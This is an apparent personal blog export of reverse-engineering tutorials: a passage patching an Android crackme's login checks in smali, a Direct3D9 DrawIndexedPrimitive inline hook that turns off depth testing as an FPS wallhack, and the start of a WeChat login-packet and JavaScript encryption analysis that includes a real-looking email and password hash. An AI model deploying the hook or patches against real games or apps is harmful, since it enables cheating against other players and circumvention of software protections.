<figure class="highlight smali"><table><tr><td class="code"><pre><span class="line"><span class="comment"># instance fields</span></span><br><span class="line"><span class="keyword">.field</span><span class="keyword"> final</span><span class="keyword"> synthetic</span> this$0:<span class="class">Lcom/pj/crack_one/MainActivity;</span></span><br></pre></td></tr></table></figure>
<p>这个就是一个实例对象，也就是外部类自身。</p>
<figure class="highlight smali"><table><tr><td class="code"><pre><span class="line"><span class="comment"># direct methods</span></span><br><span class="line"><span class="keyword">.method</span><span class="keyword"> constructor</span> &lt;init&gt;(<span class="class">Lcom/pj/crack_one/MainActivity;</span>)V</span><br><span class="line"><span class="keyword">    .locals</span> 0</span><br><span class="line"></span><br><span class="line"><span class="keyword">    .prologue</span></span><br><span class="line"><span class="keyword">    .line</span> 1</span><br><span class="line">   <span class="built_in"> iput-object </span>p1, p0, <span class="class">Lcom/pj/crack_one/MainActivity$1;</span>-&gt;this$0:<span class="class">Lcom/pj/crack_one/MainActivity;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">    .line</span> 25</span><br><span class="line">   <span class="built_in"> invoke-direct </span>&#123;p0&#125;, <span class="class">Ljava/lang/Object;</span>-&gt;&lt;init&gt;()V</span><br><span class="line"></span><br><span class="line">    return-void</span><br><span class="line"><span class="keyword">.end method</span></span><br></pre></td></tr></table></figure>
<p>这个就是构造方法，可以看到除了初始的那个无参构造方法，他在前面添加了一个赋值操作，将p1寄存器的值赋值为实例对象。</p>
<figure class="highlight smali"><table><tr><td class="code"><pre><span class="line"><span class="comment"># virtual methods</span></span><br><span class="line"><span class="keyword">.method</span><span class="keyword"> public</span> onClick(<span class="class">Landroid/view/View;</span>)V</span><br><span class="line"><span class="keyword">    .locals</span> 3</span><br><span class="line"><span class="keyword">    .param</span> p1, <span class="string">"v"</span>    <span class="comment"># Landroid/view/View;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">    .prologue</span></span><br><span class="line">   <span class="built_in"> const/4 </span>v2, 0x0</span><br><span class="line"></span><br><span class="line"><span class="keyword">    .line</span> 29</span><br><span class="line">   <span class="built_in"> iget-object </span>v0, p0, <span class="class">Lcom/pj/crack_one/MainActivity$1;</span>-&gt;this$0:<span class="class">Lcom/pj/crack_one/MainActivity;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># getter for: Lcom/pj/crack_one/MainActivity;-&gt;username:Landroid/widget/EditText;</span></span><br><span class="line">   <span class="built_in"> invoke-static </span>&#123;v0&#125;, <span class="class">Lcom/pj/crack_one/MainActivity;</span>-&gt;access$0(<span class="class">Lcom/pj/crack_one/MainActivity;</span>)<span class="class">Landroid/widget/EditText;</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in"> move-result-object </span>v0</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> invoke-virtual </span>&#123;v0&#125;, <span class="class">Landroid/widget/EditText;</span>-&gt;getText()<span class="class">Landroid/text/Editable;</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in"> move-result-object </span>v0</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> invoke-interface </span>&#123;v0&#125;, <span class="class">Landroid/text/Editable;</span>-&gt;toString()<span class="class">Ljava/lang/String;</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in"> move-result-object </span>v0</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> const-string </span>v1, <span class="string">"wker"</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in"> invoke-virtual </span>&#123;v0, v1&#125;, <span class="class">Ljava/lang/String;</span>-&gt;equals(<span class="class">Ljava/lang/Object;</span>)Z</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> move-result </span>v0</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> if-eqz </span>v0,<span class="keyword"> :cond_0</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in"> iget-object </span>v0, p0, <span class="class">Lcom/pj/crack_one/MainActivity$1;</span>-&gt;this$0:<span class="class">Lcom/pj/crack_one/MainActivity;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># getter for: Lcom/pj/crack_one/MainActivity;-&gt;password:Landroid/widget/EditText;</span></span><br><span class="line">   <span class="built_in"> invoke-static </span>&#123;v0&#125;, <span class="class">Lcom/pj/crack_one/MainActivity;</span>-&gt;access$1(<span class="class">Lcom/pj/crack_one/MainActivity;</span>)<span class="class">Landroid/widget/EditText;</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in"> move-result-object </span>v0</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> invoke-virtual </span>&#123;v0&#125;, <span class="class">Landroid/widget/EditText;</span>-&gt;getText()<span class="class">Landroid/text/Editable;</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in"> move-result-object </span>v0</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> invoke-interface </span>&#123;v0&#125;, <span class="class">Landroid/text/Editable;</span>-&gt;toString()<span class="class">Ljava/lang/String;</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in"> move-result-object </span>v0</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> const-string </span>v1, <span class="string">"wfc"</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in"> invoke-virtual </span>&#123;v0, v1&#125;, <span class="class">Ljava/lang/String;</span>-&gt;equals(<span class="class">Ljava/lang/Object;</span>)Z</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> move-result </span>v0</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> if-eqz </span>v0,<span class="keyword"> :cond_0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">    .line</span> 31</span><br><span class="line">   <span class="built_in"> iget-object </span>v0, p0, <span class="class">Lcom/pj/crack_one/MainActivity$1;</span>-&gt;this$0:<span class="class">Lcom/pj/crack_one/MainActivity;</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in"> const-string </span>v1, <span class="string">"success"</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in"> invoke-static </span>&#123;v0, v1, v2&#125;, <span class="class">Landroid/widget/Toast;</span>-&gt;makeText(<span class="class">Landroid/content/Context;</span><span class="class">Ljava/lang/CharSequence;</span>I)<span class="class">Landroid/widget/Toast;</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in"> move-result-object </span>v0</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> invoke-virtual </span>&#123;v0&#125;, <span class="class">Landroid/widget/Toast;</span>-&gt;show()V</span><br><span class="line"></span><br><span class="line"><span class="keyword">    .line</span> 36</span><br><span class="line">   <span class="keyword"> :goto_0</span></span><br><span class="line">    return-void</span><br><span class="line"></span><br><span class="line"><span class="keyword">    .line</span> 34</span><br><span class="line">   <span class="keyword"> :cond_0</span></span><br><span class="line">   <span class="built_in"> iget-object </span>v0, p0, <span class="class">Lcom/pj/crack_one/MainActivity$1;</span>-&gt;this$0:<span class="class">Lcom/pj/crack_one/MainActivity;</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in"> const-string </span>v1, <span class="string">"false"</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in"> invoke-static </span>&#123;v0, v1, v2&#125;, <span class="class">Landroid/widget/Toast;</span>-&gt;makeText(<span class="class">Landroid/content/Context;</span><span class="class">Ljava/lang/CharSequence;</span>I)<span class="class">Landroid/widget/Toast;</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in"> move-result-object </span>v0</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> invoke-virtual </span>&#123;v0&#125;, <span class="class">Landroid/widget/Toast;</span>-&gt;show()V</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> goto </span>:goto_0</span><br><span class="line"><span class="keyword">.end method</span></span><br></pre></td></tr></table></figure>
<p>这个就是我们关注的重点。<br>首先我们用到了3个寄存器</p>
<figure class="highlight smali"><table><tr><td class="code"><pre><span class="line"><span class="keyword">.param</span> p1, <span class="string">"v"</span>    <span class="comment"># Landroid/view/View;</span></span><br></pre></td></tr></table></figure>
<p>参数的一个名字，传进来一个View对象</p>
<figure class="highlight smali"><table><tr><td class="code"><pre><span class="line"><span class="keyword">.prologue</span></span><br><span class="line">const/4 v2, 0x0</span><br></pre></td></tr></table></figure>
<p>代码开始，并且将v2寄存器赋值为0x0</p>
<figure class="highlight smali"><table><tr><td class="code"><pre><span class="line">iget-object v0, p0, <span class="class">Lcom/pj/crack_one/MainActivity$1;</span>-&gt;this$0:<span class="class">Lcom/pj/crack_one/MainActivity;</span></span><br></pre></td></tr></table></figure>
<p>这个就是将v0赋值为我们p0指向的this，其实也就是外部类的对象。</p>
<figure class="highlight smali"><table><tr><td class="code"><pre><span class="line">invoke-static &#123;v0&#125;, <span class="class">Lcom/pj/crack_one/MainActivity;</span>-&gt;access$0(<span class="class">Lcom/pj/crack_one/MainActivity;</span>)<span class="class">Landroid/widget/EditText;</span></span><br><span class="line"></span><br><span class="line">move-result-object v0</span><br></pre></td></tr></table></figure>
<p>这个用到了access这个方法，这个方法其实就是在内部类调用外部类私有成员的时候自动生成的。</p>
<figure class="highlight smali"><table><tr><td class="code"><pre><span class="line"><span class="keyword">.method</span><span class="keyword"> static</span><span class="keyword"> synthetic</span> access$0(<span class="class">Lcom/pj/crack_one/MainActivity;</span>)<span class="class">Landroid/widget/EditText;</span></span><br><span class="line"><span class="keyword">    .locals</span> 1</span><br><span class="line"></span><br><span class="line"><span class="keyword">    .prologue</span></span><br><span class="line"><span class="keyword">    .line</span> 14</span><br><span class="line">   <span class="built_in"> iget-object </span>v0, p0, <span class="class">Lcom/pj/crack_one/MainActivity;</span>-&gt;username:<span class="class">Landroid/widget/EditText;</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in"> return-object </span>v0</span><br><span class="line"><span class="keyword">.end method</span></span><br></pre></td></tr></table></figure>
<p>其实可以看出，也就是返回了username这个编辑框的对象。</p>
<figure class="highlight smali"><table><tr><td class="code"><pre><span class="line">invoke-virtual &#123;v0&#125;, <span class="class">Landroid/widget/EditText;</span>-&gt;getText()<span class="class">Landroid/text/Editable;</span></span><br><span class="line"></span><br><span class="line">move-result-object v0</span><br><span class="line"></span><br><span class="line">invoke-interface &#123;v0&#125;, <span class="class">Landroid/text/Editable;</span>-&gt;toString()<span class="class">Ljava/lang/String;</span></span><br><span class="line"></span><br><span class="line">move-result-object v0</span><br></pre></td></tr></table></figure>
<p>这个就是一样的东西，就是获取Text，然后给v0，然后获得toString，再给v0。</p>
<figure class="highlight smali"><table><tr><td class="code"><pre><span class="line">const-string v1, <span class="string">"wker"</span></span><br><span class="line"></span><br><span class="line">invoke-virtual &#123;v0, v1&#125;, <span class="class">Ljava/lang/String;</span>-&gt;equals(<span class="class">Ljava/lang/Object;</span>)Z</span><br><span class="line"></span><br><span class="line">move-result v0</span><br></pre></td></tr></table></figure>
<p>这个就是给v1赋值之后，将其与v0比较，然后将得到的结果给v0，也就是比较的返回值。</p>
<figure class="highlight smali"><table><tr><td class="code"><pre><span class="line">if-eqz v0,<span class="keyword"> :cond_0</span></span><br></pre></td></tr></table></figure>
<p>这个就是判断如果是0的话呢就跳转，也就是打印错误的。<br>下面判断密码的代码是基本一样的。</p>
<figure class="highlight smali"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">.line</span> 34</span><br><span class="line">:cond_0</span><br><span class="line">iget-object v0, p0, <span class="class">Lcom/pj/crack_one/MainActivity$1;</span>-&gt;this$0:<span class="class">Lcom/pj/crack_one/MainActivity;</span></span><br><span class="line"></span><br><span class="line">const-string v1, <span class="string">"false"</span></span><br><span class="line"></span><br><span class="line">invoke-static &#123;v0, v1, v2&#125;, <span class="class">Landroid/widget/Toast;</span>-&gt;makeText(<span class="class">Landroid/content/Context;</span><span class="class">Ljava/lang/CharSequence;</span>I)<span class="class">Landroid/widget/Toast;</span></span><br><span class="line"></span><br><span class="line">move-result-object v0</span><br><span class="line"></span><br><span class="line">invoke-virtual &#123;v0&#125;, <span class="class">Landroid/widget/Toast;</span>-&gt;show()V</span><br><span class="line"></span><br><span class="line">goto<span class="keyword"> :goto_0</span></span><br></pre></td></tr></table></figure>
<p>可以看到如果跳到cond_0的话呢就是打印错误，所以最简单的方法就是，将两个if语句干掉，就不会跳转，而是直接一直往下执行，执行到：</p>
<figure class="highlight smali"><table><tr><td class="code"><pre><span class="line"><span class="keyword">.line</span> 31</span><br><span class="line">iget-object v0, p0, <span class="class">Lcom/pj/crack_one/MainActivity$1;</span>-&gt;this$0:<span class="class">Lcom/pj/crack_one/MainActivity;</span></span><br><span class="line"></span><br><span class="line">const-string v1, <span class="string">"success"</span></span><br><span class="line"></span><br><span class="line">invoke-static &#123;v0, v1, v2&#125;, <span class="class">Landroid/widget/Toast;</span>-&gt;makeText(<span class="class">Landroid/content/Context;</span><span class="class">Ljava/lang/CharSequence;</span>I)<span class="class">Landroid/widget/Toast;</span></span><br><span class="line"></span><br><span class="line">move-result-object v0</span><br><span class="line"></span><br><span class="line">invoke-virtual &#123;v0&#125;, <span class="class">Landroid/widget/Toast;</span>-&gt;show()V</span><br><span class="line"></span><br><span class="line"><span class="keyword">.line</span> 36</span><br><span class="line">:goto_0</span><br><span class="line">return-void</span><br></pre></td></tr></table></figure>
<p>也就执行打印成功，最后返回了。<br>最后编译，结果和我们预想的是一样的。</p>
]]></content>
      <categories>
        <category>逆向分析</category>
      </categories>
      <tags>
        <tag>逆向分析</tag>
      </tags>
  </entry>
  <entry>
    <title>FPS 3DHook</title>
    <url>/2020/03/16/FPS-3DHook/</url>
    <content><![CDATA[<h1 id="D3D-Hook"><a href="#D3D-Hook" class="headerlink" title="D3D Hook"></a>D3D Hook</h1><p>之前做FPS的透视自瞄，都是通过三维坐标进行三角函数计算实现的方框自瞄，但是这种确实是有一定的占用内存的嫌疑，所以使用D3DHook是相对而言比较轻松的一种写法，而且也是比较固定的一个框架。</p>
<h2 id="简单的D3D知识"><a href="#简单的D3D知识" class="headerlink" title="简单的D3D知识"></a>简单的D3D知识</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 从索引缓存区绘制图元，参数 1  为图元格式，参数 4  为顶点数，参数 6  为三角形数</span></span><br><span class="line">m_pDevice-&gt;DrawIndexedPrimitive( D3DPT_TRIANGLELIST, <span class="number">0</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">4</span> );</span><br></pre></td></tr></table></figure>
<p>这句代码就是用来绘制我们的模型的，是位于：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">m_pDevice-&gt;BeginScene();</span><br><span class="line"></span><br><span class="line"><span class="comment">/**/</span></span><br><span class="line">m_pDevice-&gt;EndScene();</span><br></pre></td></tr></table></figure>
<p>之间的一句代码，如果将其注释掉，那么将不会再绘制模型了，这也是我们实现Hook的一个关键点，因为我们在绘制完毕模型之后，我们就可以调用类中的一个方法：<code>m_pDevice-&gt;SetRenderState( D3DRS_ZENABLE, D3DZB_FALSE );</code>这句代码如果不使用，默认为FALSE，但是开发人员为了将我们的模型隐藏在建筑物的后面，他会将我们的这个代码设置为TRUE，以此进行任务的遮挡，其实也就是我们的一个前面的物体遮挡后面物体的一个效果。<br>所以我们的基本思路也就定下来了，也就是我们Hook了<code>DrawIndexedPrimitive</code>之后，然后将指定的模型<code>SetRenderState</code>为FALSE就可以了。</p>
<h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><p>因为我们要Hook的<code>DrawIndexedPrimitive</code>方法是一个成员方法，所以我们需要使用基址加偏移的方法进行一个Hook，其实C++的一个类成员方法的调用，第一个参数传递的就是成员本身，所以说，也就是调用了一个全局方法，然后将对象自身传递过去就实现了所谓的类方法调用，所以我们是要找到这个类方法的一个地址，但是这个地址比较特殊，我们是要使用基址加偏移的方法进行定位。<br>首先我们自己写一个这个方法，然后找到对应的地址：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">00AA19A6 8B 46 78             mov         eax,dword ptr [esi+78h]  </span><br><span class="line">00AA19A9 8B 08                mov         ecx,dword ptr [eax]  </span><br><span class="line">00AA19AB 8B 91 48 01 00 00    mov         edx,dword ptr [ecx+148h]  </span><br><span class="line">00AA19B1 6A 04                push        4  </span><br><span class="line">00AA19B3 6A 00                push        0  </span><br><span class="line">00AA19B5 6A 04                push        4  </span><br><span class="line">00AA19B7 6A 00                push        0  </span><br><span class="line">00AA19B9 6A 00                push        0  </span><br><span class="line">00AA19BB 6A 04                push        4  </span><br><span class="line">00AA19BD 50                   push        eax  </span><br><span class="line">00AA19BE FF D2                call        edx</span><br></pre></td></tr></table></figure>
<p>可以看到他call的函数并不是一个固定的地址，而是一个寄存器，寄存器的地址，其实也可以一步步推出来，比较关键的就是那个ESI，他的值是：0x012ffd38，但是我没校验是不是基地址，一般可以我感觉，但是这样有点麻烦，比较简单的方法就是直接进入edx那个地址，然后计算相对于DLL的一个偏移量，计算的时候用模块基地址加上偏移量就可以了。<br>然后我们跟进去看一下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">547348C0 8B FF                mov         edi,edi  </span><br><span class="line">547348C2 55                   push        ebp  </span><br><span class="line">547348C3 8B EC                mov         ebp,esp</span><br></pre></td></tr></table></figure>
<p>模块是：d3d9.DLL，一计算发现RVA为：0x548c0，前五个字节是正好的，所以我们也就没啥麻烦的了，直接Hook就好了。<br>这里其他的一些代码我就不列出来了，因为不关键，我就写关键的：<br>首先我们需要一个计算地址的函数：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">ULONG_PTR <span class="title">GetDrawIndexedPrimitiveAddress</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HANDLE h = GetModuleHandle(<span class="string">"d3d9.dll"</span>);</span><br><span class="line">	<span class="keyword">if</span>(h==INVALID_HANDLE_VALUE)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">return</span> (ULONG_PTR)h+<span class="number">0x548c0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这样子就能找到函数的地址了，因为我们的DLL地址会变，所以每次都要找的。<br>然后当我们的DLL被注入的时候我们就去HOOK<code>DrawIndexedPrimitive</code>这个函数：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">HookDrawIndexedPrimitive</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	ULONG_PTR address = GetDrawIndexedPrimitiveAddress();</span><br><span class="line">	jmpto =address+<span class="number">5</span>;</span><br><span class="line">	DWORD oldPro;</span><br><span class="line">	<span class="keyword">if</span>(VirtualProtect((LPVOID)address,<span class="number">5</span>,PAGE_EXECUTE_READWRITE,&amp;oldPro))</span><br><span class="line">	&#123;</span><br><span class="line">		DWORD value = (DWORD)MyDrawIndexedPrimitive-address<span class="number">-5</span>; </span><br><span class="line">		_asm</span><br><span class="line">		&#123;</span><br><span class="line">			mov eax,address</span><br><span class="line">			mov byte ptr[eax],<span class="number">0xe9</span></span><br><span class="line">			add eax,<span class="number">1</span></span><br><span class="line">			mov ebx,value</span><br><span class="line">			mov dword ptr[eax],ebx</span><br><span class="line">		&#125;</span><br><span class="line">		VirtualProtect((LPVOID)address,<span class="number">5</span>,oldPro,&amp;oldPro);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>获取到函数地址之后，我们就要写HOOK，<code>MyDrawIndexedPrimitive</code>这个使我们要跳到的地址，我们这里使用的HOOK方法我是看别人这么写的，大同小异，也就是第一个e9为jmp，然后再将我们的地址放进去就好了，简单计算一下得到value就可以了。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//这个WINAPI加不加代表返回的时候是retn还是retn 1c</span></span><br><span class="line"><span class="comment">//被这个关键字修饰的函数，其参数都是从右向左通过堆栈传递的(__fastcall 的前面部分由ecx,edx传)， 函数调用在返回前要由被调用者清理堆栈(这句话是关键)。自己在退出时清空堆栈，所以这里要加否则堆栈不平衡</span></span><br><span class="line"><span class="function">HRESULT WINAPI <span class="title">MyDrawIndexedPrimitive</span><span class="params">(LPDIRECT3DDEVICE9 pDevice,D3DPRIMITIVETYPE dtype,INT BaseVertexIndex,UINT MinVertexIndex,UINT NumVertices,UINT startIndex,UINT primCount)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	IDirect3DVertexBuffer9* pStreamData = <span class="literal">NULL</span>;</span><br><span class="line">	UINT iOffsetInBytes,iStride;</span><br><span class="line">	<span class="keyword">if</span> (pDevice-&gt;GetStreamSource(<span class="number">0</span>,&amp;pStreamData,&amp;iOffsetInBytes,&amp;iStride)==D3D_OK)</span><br><span class="line">	&#123;</span><br><span class="line">		pStreamData-&gt;Release();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (iStride==<span class="number">16</span>)<span class="comment">//深度缓存的值</span></span><br><span class="line">	&#123;</span><br><span class="line">		pDevice-&gt;SetRenderState(D3DRS_ZENABLE,FALSE);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> OriDrawIndexedPrimitive(pDevice,dtype,BaseVertexIndex,MinVertexIndex,NumVertices,startIndex,primCount);</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	_asm</span></span><br><span class="line"><span class="comment">	&#123;</span></span><br><span class="line"><span class="comment">		mov esp,ebp</span></span><br><span class="line"><span class="comment">		pop ebp</span></span><br><span class="line"><span class="comment">		//原代码</span></span><br><span class="line"><span class="comment">		mov edi,edi  </span></span><br><span class="line"><span class="comment">		push ebp  </span></span><br><span class="line"><span class="comment">		mov ebp,esp</span></span><br><span class="line"><span class="comment">		mov eax,jmpto</span></span><br><span class="line"><span class="comment">		jmp eax</span></span><br><span class="line"><span class="comment">	&#125;*/</span></span><br><span class="line">	<span class="comment">//_asm</span></span><br><span class="line">	<span class="comment">//&#123;</span></span><br><span class="line">	<span class="comment">//	mov esp,ebp</span></span><br><span class="line">	<span class="comment">//	pop ebp</span></span><br><span class="line">	<span class="comment">//	retn 0x1c</span></span><br><span class="line">	<span class="comment">//&#125;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里可以看到，原函数其实是6个参数，但是我们要七个参数，其实也就是我们要先接受自身，然后我们在最后的时候要跳回去：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">DWORD jmpto = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">__declspec(naked) <span class="function">HRESULT WINAPI <span class="title">OriDrawIndexedPrimitive</span><span class="params">(LPDIRECT3DDEVICE9 pDevice,D3DPRIMITIVETYPE dtype,INT BaseVertexIndex,UINT MinVertexIndex,UINT NumVertices,UINT startIndex,UINT primCount)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	_asm</span><br><span class="line">	&#123;</span><br><span class="line">		mov edi,edi  </span><br><span class="line">		push ebp  </span><br><span class="line">		mov ebp,esp</span><br><span class="line">		mov eax,jmpto</span><br><span class="line">		jmp eax</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>一个空函数，jmpto是在我们之前定义的，这里需要注意的是我们需要使用WINAPI表示我们这个函数是stdcall的调用约定，这里我踩坑了，否则我们在函数执行结束之后是不能进行自动清理堆栈的。<br>这里我们就是一个基本的D3D操作，意思就是说iStride深度缓存的值未16的时候我们就让他透视，其实这个16是我们需要调试寻找的，可以通过很多手段，例如共享内存操作之类的，也可以使用设置新的lang来实现，反正很多都是可以找到的，但是我们找到16之后并不是万事大吉，因为进入游戏发现地图也没有了，所以我们要判断NumVertices的值，这个是模型的顶点数，也是需要寻找的，但是却不是最好的方法，最好的方法是我们通过附加游戏找到调用<code>DrawIndexedPrimitive</code>这个函数的外层call找到有没有一个标识来代表是否可以表示人，我们再通过hook之类的判断来告诉我们是不是需要清除深度缓存。</p>
]]></content>
      <categories>
        <category>逆向分析</category>
      </categories>
      <tags>
        <tag>逆向分析</tag>
      </tags>
  </entry>
  <entry>
    <title>微信公众号开发框架</title>
    <url>/2020/03/13/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7%E5%BC%80%E5%8F%91%E6%A1%86%E6%9E%B6/</url>
    <content><![CDATA[<h1 id="微信公众号框架"><a href="#微信公众号框架" class="headerlink" title="微信公众号框架"></a>微信公众号框架</h1><p>类似的程序之前写过QQ的，当时玩菠菜的时候写的，但是发现QQ现在使用的越来越少了，公众号这个东西逐渐映入眼帘，之前也看到有人用这个东西写框架，之前没时间，现在时间有了，所以我也就开发一下这个框架，可以方便之后使用。</p>
<p><em>基本的用途：</em><br>根据用户的输入，来执行一些I/O操作较少的命令并将其结果返回给用户。</p>
<p><em>框架平台：</em></p>
<ol>
<li>安卓</li>
<li>Windows</li>
</ol>
<p>其实我一开始写的是Windows平台下的，基本写完了，但是由于一部分小原因，我就没有继续往下开发，但是我把安卓平台下的已经写完了，并且实现了接口的对外开放。</p>
<h2 id="实现效果"><a href="#实现效果" class="headerlink" title="实现效果"></a>实现效果</h2><p>这里我用安卓平台下的APP进行演示。<br>首先我们先要拥有一个公众号（订阅号），很简单注册，有微信号就好。<br>先登录我们的公众号：</p>
<p><img src="img1.jpg" alt="扫码登录"></p>
<p>信息监视：</p>
<p><img src="img2.gif" alt="信息监视"></p>
<p>就是类似这样子的效果，用户输入的内容是我们可以监控，并且根据用户输入来进行信息的查询，这里我只是简单的实现一个功能，但是其他的无非就是照葫芦画瓢，好了演示就到这里。</p>
<h2 id="具体实现"><a href="#具体实现" class="headerlink" title="具体实现"></a>具体实现</h2><p>Windows版本的我为什么开发完毕，是因为我的VS2010基本被一些大型框架丢弃了，但是我电脑C盘不够用更新不了，像jsoncpp这种的没法用，实在太麻烦了。<br>接下来，我会带着大家用java去完整的开发这样子的一个框架，文章可能略长。<br>我们需要实现的效果是这样的，为了后期开发的方便，在之前的登录和信息监视都是需要我们写成一个完整框架，并且对外提供一个类似于这样子的一个方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//对外实现的接口</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> String <span class="title">getReturnMessage</span><span class="params">(String Name,String Content)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> indexOf = <span class="number">0</span>;</span><br><span class="line">	StringBuffer sb = <span class="keyword">new</span> StringBuffer();</span><br><span class="line">	<span class="comment">//子域名查询</span></span><br><span class="line">	<span class="keyword">if</span>((indexOf = Content.indexOf(<span class="string">"子域名="</span>))!=-<span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			List&lt;String&gt; subDomin = GetSubDomin(Content.substring(indexOf));</span><br><span class="line">			<span class="keyword">for</span> (String string : subDomin) &#123;</span><br><span class="line">				sb.append(string).append(<span class="string">"\r\n"</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> sb.toString();</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> Name+<span class="string">"你的内容没有对应的查询内容"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>方法是这样的，在我们信息接收到的时候调用，参数有两个，一个是发信息的姓名（用来判断是否是我们想要提供服的用户，我没有找到一个合适的ID进行准确判断），另一个是用户发送的信息（判断我们需要返回的内容），返回值就是我们要发送给用户的信息。</p>
<p>我们需要用到的技术：</p>
<ol>
<li>基本的抓包技术</li>
<li>js加密</li>
<li>cookie处理</li>
<li>json解析</li>
<li>正则表达式</li>
</ol>
<p>基本就这几个，还有一些杂碎的我会在后面说到，为了保障我账号的一个安全，在登录封包的时候我会用<code>wkertest666</code>代替我的密码。</p>
<p>首先我们先来捕获登录的封包：<br>关键封包：<br><img src="img3.jpg" alt="登录封包"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username&#x3D;3311736869%40qq.com&amp;pwd&#x3D;45ebabf1cfa6670dbc5dac1ca48842b4&amp;imgcode&#x3D;&amp;f&#x3D;json&amp;userlang&#x3D;zh_CN&amp;redirect_url&#x3D;&amp;token&#x3D;&amp;lang&#x3D;zh_CN&amp;ajax&#x3D;1</span><br></pre></td></tr></table></figure>
<p>进行简单的分析可以看到，密码的加密明显没有加盐，这是比较简单的一方面，并且有几个参数为空，比较扎眼的是<code>imgcode</code>和<code>token</code>这两个字段，token我猜测可能是用来切换用户的，imgcode是验证码，这个我在编写Windows版本的时候解决了，在我们多次登录账号并且在短时间内的时候，确实会让我们输入验证码，也比较好解决，但是我在写Android的时候他又不出来了，所以我们这里暂时先不考虑验证码的这个特殊情况。<br>username是utf-8编码的一个字符串，而pwd是微信自己的一个加密算法，分析起来不难，我带着大家分析一下：</p>
<h3 id="js加密"><a href="#js加密" class="headerlink" title="js加密"></a>js加密</h3><p>首先找到我们提交这个封包的ajax：<br><img src="img4.jpg" alt="pwd加密"><br>明显是一个嵌套，先截取0-16的字符串，然后传递给r函数，我们下断点跟进r这个函数：<br><img src="img5.jpg" alt="r函数"><br>可以看到有一个自执行，但是比较那个是，这里的自执行，明显跳进的是最后一个switch的情况，所以我们只要分析<code>return e(o(n))</code>这个返回值就好了，n就是我们输入的密码前17位，然后我们跟进o函数：<br><img src="img6.jpg" alt="o函数"><br>这又是一个自执行，调用的是u的返回值，u函数：</p>
